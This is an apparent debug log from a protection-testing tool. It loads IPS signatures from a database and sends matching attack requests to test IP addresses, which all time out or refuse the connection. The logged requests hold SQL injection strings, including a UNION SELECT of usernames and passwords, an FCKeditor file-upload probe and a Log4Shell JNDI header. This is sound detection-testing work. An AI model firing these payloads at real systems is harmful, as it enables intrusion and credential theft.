2025-12-02 16:53:26 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:53:26 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:53:26 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:53:26 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:53:26 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:53:26 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:53:26 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:53:26 - WARNING - load_csv_to_db:276 - Skipping row 10: Missing ProtectionName or Resource.
2025-12-02 16:53:26 - WARNING - load_csv_to_db:276 - Skipping row 16: Missing ProtectionName or Resource.
2025-12-02 16:53:26 - INFO - load_csv_to_db:311 - CSV data loaded successfully into protections database.
2025-12-02 16:53:26 - DEBUG - load_csv_to_db:317 - Database connection closed after load_csv_to_db.
2025-12-02 16:56:59 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 16:56:59 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 16:56:59 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 16:57:15 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 16:57:15 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 16:57:15 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 16:57:15 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:57:36 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F43770>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:57:37 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 16:57:37 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 16:57:37 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 16:57:37 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:57:58 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F5B890>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:57:59 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Injection Scanning Attempt
2025-12-02 16:57:59 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Injection Scanning Attempt', 'CVE-2020-13118,CVE-2020-5510,CVE-2021-36748,CVE-2021-43140,CVE-2022-24219,CVE-2022-24220,CVE-2022-24221,CVE-2022-24222,CVE-2022-27412,CVE-2022-34265,CVE-2022-35121,CVE-2022-36669,CVE-2022-47862,CVE-2023-24780', 'GET', "http://{{IP}}/interscan/cgi-bin/FtpSave.dll?I'm Here", 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 16:57:59 - INFO - get_protection_by_name:399 - Protection 'SQL Injection Scanning Attempt' retrieved successfully.
2025-12-02 16:57:59 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/interscan/cgi-bin/FtpSave.dll?I'm Here with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:58:20 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/interscan/cgi-bin/FtpSave.dll?I'm Here: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /interscan/cgi-bin/FtpSave.dll?I'm%20Here (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54FB4410>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:58:20 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers SQL Injection Evasion Techniques
2025-12-02 16:58:20 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers SQL Injection Evasion Techniques', 'CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225', 'GET', 'http://{{IP}}/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 16:58:20 - INFO - get_protection_by_name:399 - Protection 'SQL Servers SQL Injection Evasion Techniques' retrieved successfully.
2025-12-02 16:58:20 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:58:41 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F336F0>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:58:42 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers Unauthorized Commands SQL Injection
2025-12-02 16:58:42 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers Unauthorized Commands SQL Injection', 'CVE-2014-3704,CVE-2019-13978,CVE-2019-9053,CVE-2021-41843,CVE-2022-0592,CVE-2022-0781,CVE-2022-0836,CVE-2022-1905,CVE-2022-26887,CVE-2022-28346,CVE-2022-30809,CVE-2022-30810,CVE-2022-30815,CVE-2024-33559', 'GET', 'http://{{IP}}/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--', 'http', 'High', 'High', 'Medium', '')
2025-12-02 16:58:42 - INFO - get_protection_by_name:399 - Protection 'SQL Servers Unauthorized Commands SQL Injection' retrieved successfully.
2025-12-02 16:58:42 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965-- with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:58:49 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 16:58:49 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 16:58:49 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 16:58:49 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:59:03 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT%2046434965-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F33E10>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:59:04 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 16:59:04 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 16:59:04 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 16:59:04 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:59:10 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54EC3AD0>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:59:11 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Injection Scanning Attempt
2025-12-02 16:59:11 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Injection Scanning Attempt', 'CVE-2020-13118,CVE-2020-5510,CVE-2021-36748,CVE-2021-43140,CVE-2022-24219,CVE-2022-24220,CVE-2022-24221,CVE-2022-24222,CVE-2022-27412,CVE-2022-34265,CVE-2022-35121,CVE-2022-36669,CVE-2022-47862,CVE-2023-24780', 'GET', "http://{{IP}}/interscan/cgi-bin/FtpSave.dll?I'm Here", 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 16:59:11 - INFO - get_protection_by_name:399 - Protection 'SQL Injection Scanning Attempt' retrieved successfully.
2025-12-02 16:59:11 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/interscan/cgi-bin/FtpSave.dll?I'm Here with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:59:25 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F8B350>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:59:26 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers SQL Injection Evasion Techniques
2025-12-02 16:59:26 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers SQL Injection Evasion Techniques', 'CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225', 'GET', 'http://{{IP}}/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 16:59:26 - INFO - get_protection_by_name:399 - Protection 'SQL Servers SQL Injection Evasion Techniques' retrieved successfully.
2025-12-02 16:59:26 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:59:32 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/interscan/cgi-bin/FtpSave.dll?I'm Here: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /interscan/cgi-bin/FtpSave.dll?I'm%20Here (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F8A250>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:59:33 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers Unauthorized Commands SQL Injection
2025-12-02 16:59:33 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers Unauthorized Commands SQL Injection', 'CVE-2014-3704,CVE-2019-13978,CVE-2019-9053,CVE-2021-41843,CVE-2022-0592,CVE-2022-0781,CVE-2022-0836,CVE-2022-1905,CVE-2022-26887,CVE-2022-28346,CVE-2022-30809,CVE-2022-30810,CVE-2022-30815,CVE-2024-33559', 'GET', 'http://{{IP}}/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--', 'http', 'High', 'High', 'Medium', '')
2025-12-02 16:59:33 - INFO - get_protection_by_name:399 - Protection 'SQL Servers Unauthorized Commands SQL Injection' retrieved successfully.
2025-12-02 16:59:33 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965-- with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:59:47 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F8A030>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:59:48 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers UNION Query-based SQL Injection
2025-12-02 16:59:48 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers UNION Query-based SQL Injection', 'CVE-2022-31061,CVE-2022-32007,CVE-2022-32025,CVE-2022-32026,CVE-2022-32028,CVE-2022-38627,CVE-2022-40049,CVE-2022-44137,CVE-2022-45030,CVE-2022-46124,CVE-2022-47860,CVE-2023-20110,CVE-2023-46748,CVE-2023-51951', 'GET', 'http://{{IP}}/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 16:59:48 - INFO - get_protection_by_name:399 - Protection 'SQL Servers UNION Query-based SQL Injection' retrieved successfully.
2025-12-02 16:59:48 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 16:59:54 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT%2046434965-- (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F898C0>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 16:59:55 - INFO - get_protection_by_name:371 - Fetching protection by name: Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload
2025-12-02 16:59:55 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload', 'CVE-2008-6178,CVE-2009-2265', 'GET', 'http://{{IP}}/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php.', 'http', 'High', 'High', 'Medium', '')
2025-12-02 16:59:55 - INFO - get_protection_by_name:399 - Protection 'Adobe ColdFusion FCKeditor Input Validation Flaw Arbitrary File Upload' retrieved successfully.
2025-12-02 16:59:55 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php. with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:00:09 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/guestbook.php?lang=de&mode=new&quote=-1 UNION SELECT 0,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 FROM simpgb_users WHERE 1: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/guestbook.php?lang=de&mode=new&quote=-1%20UNION%20SELECT%200,0,username,0,password,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20FROM%20simpgb_users%20WHERE%201 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F88C00>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 17:00:10 - INFO - get_protection_by_name:371 - Fetching protection by name: Apache Log4j Remote Code Execution (CVE-2021-44228)
2025-12-02 17:00:10 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Apache Log4j Remote Code Execution (CVE-2021-44228)', 'CVE-2021-44228,CVE-2021-45046', 'GET', 'http://{{IP}}/', 'http', 'Medium', 'Critical', 'Medium', '${jndi:ldap://127.0.0.1#log4shell-generic-c6hAKQa3xrV889pe4Lrm.w.nessus.org/nessus}')
2025-12-02 17:00:10 - INFO - get_protection_by_name:399 - Protection 'Apache Log4j Remote Code Execution (CVE-2021-44228)' retrieved successfully.
2025-12-02 17:00:10 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.100/ with headers: {'User-Agent': '${jndi:ldap://127.0.0.1#log4shell-generic-c6hAKQa3xrV889pe4Lrm.w.nessus.org/nessus}'}
2025-12-02 17:00:16 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php.: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: /cgi-bin/editor/filemanager/connectors/php/upload.php?Command=FileUpload&Type=File&CurrentFolder=/fckeditor_currentfolder_file_upload-1731363398.php. (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54F8BBD0>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 17:00:17 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:00:17 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:00:17 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:00:31 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.100/: HTTPConnectionPool(host='203.0.113.100', port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000001DC54FE4490>, 'Connection to 203.0.113.100 timed out. (connect timeout=None)'))
2025-12-02 17:02:05 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:02:05 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:02:05 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:02:46 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:02:46 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:02:46 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:03:35 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:03:35 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:03:35 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:04:15 - INFO - load_protections:334 - Loading all protections from the database.
2025-12-02 17:04:15 - DEBUG - load_protections:346 - Fetched 123 records from 'protections' table.
2025-12-02 17:04:15 - DEBUG - load_protections:349 - Database connection closed after load_protections.
2025-12-02 17:04:34 - INFO - get_protection_by_name:371 - Fetching protection by name: Flexible Poll SQL Injection (CVE-2018-5988)
2025-12-02 17:04:34 - DEBUG - get_protection_by_name:384 - Protection fetched: ('Flexible Poll SQL Injection (CVE-2018-5988)', 'CVE-2018-5988', 'GET', "http://{{IP}}/cgi-bin/index.php?id='", 'http', 'Medium', 'Critical', 'Medium', '')
2025-12-02 17:04:34 - INFO - get_protection_by_name:399 - Protection 'Flexible Poll SQL Injection (CVE-2018-5988)' retrieved successfully.
2025-12-02 17:04:34 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?id=' with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:36 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?id=': HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?id=' (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8B8A0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:37 - INFO - get_protection_by_name:371 - Fetching protection by name: IMP SQL Injection (CVE-2003-0025)
2025-12-02 17:04:37 - DEBUG - get_protection_by_name:384 - Protection fetched: ('IMP SQL Injection (CVE-2003-0025)', 'CVE-2003-0025', 'GET', "http://{{IP}}/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x", 'http', 'Medium', 'High', 'Medium', '')
2025-12-02 17:04:37 - INFO - get_protection_by_name:399 - Protection 'IMP SQL Injection (CVE-2003-0025)' retrieved successfully.
2025-12-02 17:04:37 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:39 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/mailbox.php3?actionID=6&server=x&imapuser=x';somesql&pass=x (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54F8A9C0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:39 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Injection Scanning Attempt
2025-12-02 17:04:39 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Injection Scanning Attempt', 'CVE-2020-13118,CVE-2020-5510,CVE-2021-36748,CVE-2021-43140,CVE-2022-24219,CVE-2022-24220,CVE-2022-24221,CVE-2022-24222,CVE-2022-27412,CVE-2022-34265,CVE-2022-35121,CVE-2022-36669,CVE-2022-47862,CVE-2023-24780', 'GET', "http://{{IP}}/interscan/cgi-bin/FtpSave.dll?I'm Here", 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:04:39 - INFO - get_protection_by_name:399 - Protection 'SQL Injection Scanning Attempt' retrieved successfully.
2025-12-02 17:04:39 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/interscan/cgi-bin/FtpSave.dll?I'm Here with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:41 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/interscan/cgi-bin/FtpSave.dll?I'm Here: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /interscan/cgi-bin/FtpSave.dll?I'm%20Here (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54EE3AC0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:41 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers SQL Injection Evasion Techniques
2025-12-02 17:04:41 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers SQL Injection Evasion Techniques', 'CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225', 'GET', 'http://{{IP}}/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:04:41 - INFO - get_protection_by_name:399 - Protection 'SQL Servers SQL Injection Evasion Techniques' retrieved successfully.
2025-12-02 17:04:41 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:43 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers SQL Injection Evasion Techniques
2025-12-02 17:04:43 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers SQL Injection Evasion Techniques', 'CVE-2006-6177,CVE-2006-6577,CVE-2007-2492,CVE-2007-3526,CVE-2007-6656,CVE-2008-2855,CVE-2008-2856,CVE-2008-4463,CVE-2009-2341,CVE-2014-8682,CVE-2021-27581,CVE-2022-0169,CVE-2022-25225', 'GET', 'http://{{IP}}/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20', 'http', 'High', 'Critical', 'Medium', '')
2025-12-02 17:04:43 - INFO - get_protection_by_name:399 - Protection 'SQL Servers SQL Injection Evasion Techniques' retrieved successfully.
2025-12-02 17:04:43 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 with headers: {'User-Agent': 'Microsoft IE 8.0'}
2025-12-02 17:04:43 - ERROR - send_request:106 - Error sending GET request to http://203.0.113.5/cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20: HTTPConnectionPool(host='203.0.113.5', port=80): Max retries exceeded with url: /cgi-bin/index.php?go=detail&id=-99999/**/UNION/**/SELECT/**/0,1,concat(1731363118,0x3a,424340739),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x000001DC54FE46B0>: Failed to establish a new connection: [WinError 10061] No connection could be made because the target machine actively refused it'))
2025-12-02 17:04:44 - INFO - get_protection_by_name:371 - Fetching protection by name: SQL Servers Unauthorized Commands SQL Injection
2025-12-02 17:04:44 - DEBUG - get_protection_by_name:384 - Protection fetched: ('SQL Servers Unauthorized Commands SQL Injection', 'CVE-2014-3704,CVE-2019-13978,CVE-2019-9053,CVE-2021-41843,CVE-2022-0592,CVE-2022-0781,CVE-2022-0836,CVE-2022-1905,CVE-2022-26887,CVE-2022-28346,CVE-2022-30809,CVE-2022-30810,CVE-2022-30815,CVE-2024-33559', 'GET', 'http://{{IP}}/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965--', 'http', 'High', 'High', 'Medium', '')
2025-12-02 17:04:44 - INFO - get_protection_by_name:399 - Protection 'SQL Servers Unauthorized Commands SQL Injection' retrieved successfully.
2025-12-02 17:04:44 - DEBUG - send_request:87 - Sending GET request to http://203.0.113.5/cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 46434965-- with headers: {'User-Agent': 'Microsoft IE 8.0'}
